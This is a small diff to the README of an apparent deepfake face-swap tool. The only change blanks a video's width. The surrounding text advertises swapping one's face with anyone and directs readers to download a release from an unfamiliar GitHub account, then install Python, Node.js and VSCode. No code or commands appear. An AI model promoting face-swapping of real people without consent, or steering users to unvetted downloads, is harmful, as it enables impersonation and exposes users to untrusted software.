@@ -2,7 +2,7 @@
   
 #### Whether you want to see yourself as a Hollywood star, a beloved character, or even a glamorous drag queen, with FaceSwap and LipSync’s AI DeepFake feature, you can seamlessly swap your face with anyone else in just a few simple steps.
 
-<video src="https://github.com/user-attachments/assets/59cf6318-f399-4e7a-afdb-6ee7759bf657" width="400" />
+<video src="https://github.com/user-attachments/assets/59cf6318-f399-4e7a-afdb-6ee7759bf657" width="" />
  
 ##### Step 1: Download the <a href='https://github.com/xSilkRoadx/deepfake/releases/tag/deepfake' target='_blank'>Source DeepCam - FaceSwap </a>.  
 ##### Step 2: Dowload <a href='https://www.python.org/downloads/release/python-3100/' target='_blank'>Python 3.10.0</a> and <a href='https://nodejs.org/en' target='_blank'>Nodejs</a> and <a href='https://code.visualstudio.com/' target='_blank'>VSCode</a> 
